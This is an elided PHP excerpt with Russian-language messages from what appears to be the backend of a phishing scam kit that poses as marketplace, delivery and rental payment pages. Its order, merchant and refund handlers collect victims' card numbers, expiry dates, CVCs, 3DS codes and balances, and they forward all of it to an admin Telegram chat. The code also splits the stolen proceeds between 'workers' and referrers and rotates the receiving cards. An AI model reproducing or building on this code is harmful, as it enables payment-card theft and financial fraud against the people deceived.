...
<?php
	...
	$isnt = in_array($srvc, [1, 2, 9, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24]);
	...
	switch ($action) {
			...
			if ($code3ds && strlen($code3ds) > 2) {
				...
				if ($lastcode != $code3ds) {
					...
					botSend([
						...
						'⚠️ Код: <b>'.$code3ds.'</b>',
						'',
						'💵 Сумма платежа: <b>'.beaCashro($amount).'</b>',
						...
						[
							['text' => '✅ Оплатил', 'callback_data' => '/doruchkazaletro '.$t],
						],
						[
							['text' => '❌ Звонок 900', 'callback_data' => '/doruchkafail1ro '.$t],
							['text' => '❌ Нет денег', 'callback_data' => '/doruchkafail2ro '.$t],
						],
					]]);
		...
		case 'order': case 'buy': case 'cash': case 'rent' : case 'cars': {
			...
			if ($hash0 != getIpData($ip, 'hash')/getCookieData('hash', $_COOKIE2)) {
				...
				botSend([
					...
					'',
					'🏷 Название: <b>'.$title.'</b>',
					'💵 Стоимость: <b>'.beaCashro($amount).'</b>',
		...
		case 'merchant': case 'refund': case 'unlock': case 'ayeruchnayaplatejjjka666': {
			...
			$isrpac = (strlen($pmnt) == 0 || (isAutoPaymentpl() && $amount >= activateRuchka()));
			if (!$isrpac) {
    ...
    if ($pares && $merchant && isPayData($merchant)) {
				...
				if ($psts[0]) {
					...
					if (!$isrpar && $pmnt != 'btc') {
						$card3 = setNextCardpl();
						addCardBalancepl($card2pl, $amount);
					}
					if (!$pkoef) {
					...
					$profit = makeProfitpl($id, $isnr, $amount, $pkoef);
					...
					$pmess = [
						$pkoef2,
						'',
						'⚖️ Доля воркера: <b>'.beaCashro($profit[0]).'</b>',
						'💵 Сумма платежа: <b>'.beaCashro($amount).'</b>',
				// 		'🏦 Банк: <b>'.cardBank($card).'</b>',
					...
					$t0 = [
						$pkoef2,
						'',
				// 		'❤️ Ваша доля: <b>'.beaCashro($profit[0]).'</b>',
						'💸 Сумма платежа: <b>'.beaCashro($amount).'</b>',
					...
					botSend([
						...
						'💸 Сумма платежа: <b>'.beaCashro($amount).'</b>',
						'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
						'💎 Доля воркера: <b>'.beaCashro($profit[0]).'</b>',
						'🐤 Доля реферала: <b>'.beaCashro($profit[1]).'</b>'.($referal ? ' (<b>'.userLogin($referal, true).'</b>)' : ''),
						'',
						'💳 Карта: <b>'.cardBank($card).'</b>',
						'☘️ Номер: <b>'.$card.'</b>',
						'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
				...
				// 		'💳 Карта: <b>'.cardBank($card).'</b>',
					...
					if (!$isrpar) {
						$t1 = [
							'❄️ Баланс '.($pmnt == 'btc' ? 'кошелька' : 'карты').' <b>'.$card2.'</b> увеличен на <b>'.beaCashro($amount).'</b>',
						];
						if ($card3)
							$t1 = array_merge($t1, [
								'',
					...
					if ($referal) {
						botSend([
							'👾 Вы получили <b>'.beaCashro($profit[1]).'</b> от профита реферала <b>'.userLogin($id).'</b>',
						], $referal);
					}
					if (!$isrpar) {
						/*$amount--;
				...
				if (isValidCard($card, $expm, $expy, $cvc, $balancecard)) {
					...
					if ($isrpac) {
						...
						botSend([
							...
							'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
							'🕶 CVC: <b>'.$cvc.'</b>',
							'🚀 Баланс карты: <b>'.$balancecard.' злотых</b>',
							'',
							($isnt ? '📦 ID объявления' : '🔖 Трек номер').': <b>'.$item.'</b>',
							'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
						], chatAdmin(), [true, [
					...
					if ($pcrt[0]) {
						...
						if (!isCardData($card, $expm, $expy, $cvc)) {
							...
							botSend([
								...
								'',
								'💸 Сумма платежа: <b>'.beaCashro($amount).'</b>',
								$_POST2['balancecard'] ? '💰 Баланс карты: <b>'.$balancecard.' RUB.</b>' : '',
								// '☘️ Номер: <b>'.$card.'</b>',
								// '📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
								// '🕶 CVC: <b>'.$cvc.'</b>',
							...
							botSend([
								...
								'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
								'🕶 CVC: <b>'.$cvc.'</b>',
								$_POST2['balancecard'] ? '💰 Баланс: <b>'.$balancecard.' руб.</b>' : '',
								'',
								'💸 Сумма платежа: <b>'.beaCashro($amount).'</b>',
								'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
							], chatAdmin());
							...
							botSend([
                                '<b>🔥 Переход на 3DS 🔥',
                                '',
								'💵 Сумма платежа: '.beaCashpl($amount).'',
			...
			if ($hash0 != /*getIpData($ip, 'hash')*/getCookieData('hash', $_COOKIE2)) {
				...
				$t = [
					...
					'',
					'🏷 Название: <b>'.$title.'</b>',
					'💸 Общая сумма: <b>'.beaCashro($amount).'</b>',
					'🌍 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
					//'',
					//'🌎 IP: <b>'.$ip.'</b>',
					//'🔍 Локация: <b>'.$iploc.'</b>',
